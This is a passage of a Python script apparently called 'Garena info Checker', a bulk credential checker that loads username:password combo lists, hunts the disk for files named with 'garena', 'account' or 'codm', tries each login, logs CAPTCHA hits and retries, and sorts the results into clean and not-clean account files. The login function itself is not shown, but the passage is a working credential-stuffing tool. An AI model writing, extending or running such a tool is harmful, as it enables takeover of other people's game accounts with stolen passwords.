        accounts = [acc.strip() for acc in infile.readlines() if acc.strip()]
        total_accounts = len(accounts)
        print(f"\n{GREEN}[+] {RESET}Loaded: {total_accounts} accounts\n")

        for index, acc in enumerate(accounts, 1):
            print(f"\n{'-'*50}")
            if ':' not in acc:
                error_msg = "Invalid format"
                print(f"{Fore.RED}[{index}] {error_msg}: {acc}{Style.RESET_ALL}")
                write_error_account(acc, "", error_msg)
                error_count += 1
                continue

            # Always take the last two segments as username and password
            parts = acc.split(':')
            username, password = parts[-2], parts[-1]
            print(f"{Fore.GREEN}[{index}] Checking:{Style.RESET_ALL} {username}:{password}")
            
            try:
                result = check_account(username, password, date)
                print(result)

                # Handle server change case
                if "[+] PLEASE CHANGE YOUR SERVER!" in result:
                    # Don't increment index so we retry the same account
                    continue
                
                # Handle CAPTCHA in results
                if "CAPTCHA" in result or "captcha" in result.lower():
                    captcha_count += 1
                    with open(captcha_file, 'a', encoding='utf-8') as f:
                        f.write(f"{username}:{password}\n")
                    result = check_account(username, password, date)
                    print(result)
                    
                # Process results
                if "[+] Login Successful ✅" in result:
                    successful_count += 1
                elif "[FAILED]" in result:
                    failed_count += 1
                    write_failed_login(username, password, get_failure_reason(result))
                elif "[ERROR]" in result:
                    error_count += 1
                    write_error_account(username, password)
                else:
                    failed_count += 1
                    
            except Exception as e:
                error_count += 1
                write_error_account(username, password, str(e))

    # Print final summary
    print(f"\n{Fore.GREEN}[+] Total accounts checked: {total_accounts}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Successful logins: {successful_count}{Style.RESET_ALL}")
    print(f"{Fore.RED}[+] Failed logins: {failed_count}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[+] Captcha encounters: {captcha_count}{Style.RESET_ALL}")
    print(f"{Fore.RED}[+] Errors: {error_count}{Style.RESET_ALL}")
    print('-' * 50)
    print(f"{Fore.CYAN}[*] Results saved to:{Style.RESET_ALL}")
    print(f"  - Clean accounts: {clean_file}")
    print(f"  - Not clean accounts: {notclean_file}")
    print(f"  - Failed logins: {failed_login_file}")
    print(f"  - Errors: {error_file}")



def find_nearest_account_file():
    # Keywords to search for in filenames
    keywords = ["garena", "account", "codm"]
    
    # Walk through the current directory and subdirectories
    for root, _, files in os.walk(os.getcwd()):
        for file in files:
            if file.endswith(".txt") and any(keyword in file.lower() for keyword in keywords):
                return os.path.join(root, file)
    
    # If no matching file is found, use a default name in the current directory
    return os.path.join(os.getcwd(), "accounts.txt")

def clear_terminal():
    """Cross-platform terminal clearing with proper type hints"""
    import platform
    try:
        if platform.system() == 'Windows':
            os.system('cls')
        else:  # Linux, MacOS, etc.
            os.system('clear')
    except:
        # Print some newlines as fallback
        print('\n' * 100)

def taeee(jarell):
    # Validate user first
    clear_terminal()
    display_banner()
    
    def get_file_path():
        """Get the file path from user input with enhanced UI and validation."""
        print("\n" + "="*50)
        print("Bulk Account Checker".center(50))
        print("="*50 + "\n")
        
        while True:
            file_path = input(
                "Enter the path of your .txt file\n"
                "(e.g., /sdcard/Download/accounts.txt)\n"
                "Or press Enter to auto-detect nearby files: "
            ).strip()

            # Auto-detect if user pressed Enter
            if not file_path:
                print("\n🔍 Searching for nearby account files...")
                file_path = find_nearest_account_file()
                if file_path:
                    print(f"✔ Auto-selected: {file_path}")
                else:
                    print("❌ No relevant files found nearby. Please specify path.")
                    continue

            # Validate file
            if not file_path.endswith('.txt'):
                print("⚠ Please provide a .txt file.")
                continue
                
            if not os.path.isfile(file_path):
                print(f"❌ File not found: {file_path}")
                continue
                
            return file_path

    def confirm_start():
        """Get user confirmation before starting the bulk check."""
        print("\n" + "-"*50)
        input("Press Enter to begin the bulk check...".center(50) + "\n")
        print("🚀 Starting bulk check...\n")

    # Main flow
    try:
        file_path = get_file_path()
        confirm_start()
        bulk_check(file_path)
    except KeyboardInterrupt:
        print("\n❌ Operation cancelled by user.")
    except Exception as e:
        print(f"\n🔥 An error occurred: {str(e)}")

def get_device_id():
    # Directory and file path for storing device ID
    dir_path = os.path.expanduser("~/.dont_delete_me")
    file_path = os.path.join(dir_path, "here.txt")  
    # Check if the file already exists
    if os.path.exists(file_path):
        # Read the existing device ID from the file
        with open(file_path, 'r') as file:
            device_id = file.read().strip()  # Strip any extra whitespace/newlines
    else:
        # Create the directory if it doesn't exist
        os.makedirs(dir_path, exist_ok=True)  # Ensure the directory is created
        
        # Prompt for user name
        user_name = input("Enter your name: ").strip()  # Get and strip user input

        # Collect various system details for generating a unique ID
        system_info = (
            platform.system(),         # OS type (e.g., Windows, Linux)
            platform.release(),        # OS version
            platform.version(),        # OS build version
            platform.machine(),        # Hardware type (e.g., x86_64)
            platform.processor(),      # Processor information
        )

        # Generate a consistent UUID from hardware properties
        hardware_id = "-".join(system_info)  # Combine system info into a single string
        unique_id = uuid.uuid5(uuid.NAMESPACE_DNS, hardware_id)  # Generate UUID based on system info

        # Hash the unique ID for consistency and uniqueness
        device_hash = hashlib.sha256(unique_id.bytes).hexdigest()  # Create a SHA-256 hash

        # Combine user input with a portion of the hash to form the device ID
        device_id = f"{user_name}_{device_hash[:8]}"  # User name + first 8 characters of hash for uniqueness

        # Write the generated device ID to the file
        with open(file_path, 'w') as file:
            file.write(device_id)  # Save the device ID
    
    return device_id  # Return the device ID
# Run the main functio
def clear_screen():
    # Windows
    
    if os.name == 'nt':
        os.system('cls')
    # Mac and Linux
    else:
        os.system('clear')

def main():
    """Main entry point"""
    try:
        display_banner()
        
        # Directly start the account checking process
        file_path = input("Enter the path of the .txt file (ex: /sdcard/Download/filename.txt) or press Enter to find the nearest relevant file: ").strip()
        if not file_path:
            file_path = find_nearest_account_file()
        
        if not file_path.endswith('.txt') or not os.path.isfile(file_path):
            print("Invalid file path. Please provide a valid .txt file.")
            return
        
        input("Press Enter to start the bulk check...")
        bulk_check(file_path)
        
    except KeyboardInterrupt:
        print(f"\n{RED}Exiting program...{RESET}")
        sys.exit(0)

# You can remove the background task handling since it was dependent on the loginsupport module
# Color variables
W = "\033[0m"          # Reset color
GR = "\033[90m"        # Grey text
R = "\033[1;31m"       # Red text
RED = "\033[101m"      # Red background
B = "\033[0;34m\033[1m" # Bold blue text
def display_banner():
       # Clear the terminal
    
    # ------ banner -------
    print(f"{W}")
    print(f"{W}{W} [\033[1mSerperHexGod{W}] {GR}          :::!~!!!!!:.          {W}")
    print(f"{W}{GR}                  .xUHWH!! !!?M88WHX:.       {W}")
    print(f"{W}{GR}                .X*#M@$‌!!  !X!M$‌$‌$‌$‌$‌WWx:     {W}")
    print(f"{W}{GR}               :!!!!!!?H! :!$‌!$‌$‌$‌$‌$‌$‌$‌$‌$‌$‌8X:  {W}")
    print(f"{W}{GR}             !!~  ~:~!! :~!$‌!%$‌$‌$‌$‌$‌$‌$‌$‌$‌$‌8X:  {W}")
    print(f"{W}{GR}             :!~::!H![   ~.U$‌X!?W$‌$‌$‌$‌$‌$‌$‌$‌MM! {W}")
    print(f"{W}{GR}             ~!~!!!!~~ .:XW$‌$‌$‌U!!?$‌$‌$‌$‌$‌$‌WMM! {W}")
    print(f"{W}{GR}               !:~~~ .:!M*T#$‌$‌$‌$‌WX??#MRRMMM! {W}")
    print(f"{W}{GR}               ~?WuxiW*     *#$‌$‌$‌$‌8!!!!??!!! {W}")
    print(f"{W}{GR}             :X- M$‌$‌$‌$‌  {R}  *{GR}  '#T#$‌T~!8$‌WUXU~ {W}")
    print(f"{W}{GR}          :%'  ~%$‌$‌$‌Mm:         ~!~ ?$‌$‌$‌$‌$‌$‌  {W}")
    print(f"{W}{GR}          :! .-   ~T$‌$‌$‌$‌8xx.  .xWW- ~””##*'' {W}")
    print(f"{W}{GR}  .....   -~~:<  !    ~?T$‌$‌@@W@*?$‌$‌ {R} * {GR} /’   {W}")
    print(f"{W}{GR} W$‌@@M!!! .!~~ !!     .:XUW$‌W!~ '*~:   :     {W}")
    print(f"{W}{GR} %^~~'.:x%'!!  !H:   !WM$‌$‌$‌$‌Ti.: .!WUnn!     {W}")
    print(f"{W}{GR} :::~:!. :X~ .: ?H.!u *$‌$‌$‌$‌$‌$‌$‌!W:U!T$‌$‌M~     {W}")
    print(f"{W}{GR} .~~   :X@!.-~   ?@WTWo('*$‌$‌$‌W$‌TH$‌!          {W}")
    print(f"{W}{GR} Wi.~!X$‌?!-~    : ?$‌$‌$‌B$‌Wu(***$‌RM!           {W}")
    print(f"{W}{GR} $‌R@i.#~ !     :   -$‌$‌$‌$‌$‌%$‌Mm$‌;              {W}")
    print(f"{W}{GR} ?MXT@Wx.~    :     ~##$‌$‌$‌$‌M~                {W}")
    print(f"{W} ")
    print(f"\033[1m           {R}{W}{RED}{B}{W}{RED} Garena info Checker: by SerperHex {B}{W}{R}\033[0m")
    print("\n\n")
main()
